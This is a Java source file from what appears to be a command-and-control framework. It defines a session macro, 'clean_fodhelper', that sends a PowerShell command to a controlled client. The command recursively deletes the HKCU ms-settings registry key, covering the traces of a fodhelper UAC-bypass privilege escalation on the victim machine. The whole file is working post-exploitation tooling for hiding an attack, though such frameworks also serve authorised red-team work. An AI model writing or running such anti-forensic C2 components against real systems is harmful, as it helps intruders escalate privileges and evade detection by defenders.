package c2.session.macro;

import c2.HarvestProcessor;
import c2.session.IOManager;

public class CleanFodhelperMacro extends AbstractCommandMacro {

	public static final String COMMAND = "clean_fodhelper";
	public static final String CLIENT_COMMAND = "powershell.exe -c \"Remove-Item 'HKCU:\\Software\\Classes\\ms-settings\\' -Recurse -Force\"";
	
	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		this.io = io;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		io.sendCommand(sessionId, CLIENT_COMMAND);
		outcome.addSentCommand(CLIENT_COMMAND);
		outcome.addMacroMessage("Fodhelper registry cleaned up");
		return outcome;
	}

}
